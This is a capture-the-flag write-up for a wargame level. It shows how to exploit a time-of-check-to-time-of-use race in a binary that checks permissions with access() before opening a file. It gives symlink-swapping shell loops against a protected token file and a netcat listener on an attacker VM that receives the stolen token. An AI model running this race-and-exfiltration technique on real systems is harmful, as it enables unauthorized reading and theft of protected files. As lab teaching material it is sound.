After decompiling the binary, we can see that it basically sends data to a specified host on port 6969.
After trying to send the token file in the folder, we notice that we don't have the permissions to send it.
But we see in the code that the binary is using access to check the permissions, and by reading the man of access, we find : 

    Warning: Using these calls to check if a user is authorized to,
    for example, open a file before actually doing so using open(2)
    creates a security hole, because the user might exploit the short
    time interval between checking and opening the file to manipulate
    it.  For this reason, the use of this system call should be
    avoided.  (In the example just described, a safer alternative
    would be to temporarily switch the process's effective user ID to
    the real ID and then call open(2).)

So we are going to create a file on which we have the rights : /tmp/fileWeOwn
We are also going to create another file that will alternate between being a link between the file we just created and the actual token file : /tmp/link

# Terminal 1
while true; do
    ln -sf /tmp/fileWeOwn /tmp/link
    ln -sf /home/user/level10/token /tmp/link
done

# Terminal 2
while true; do ./level10 /tmp/link <your-ip>; done

We will use a VM which we know the IP of, and we will run on it : nc -lvp 6969 > received_data
The data received will be stored in that file, giving us the token to log in to flag10 and get our flag.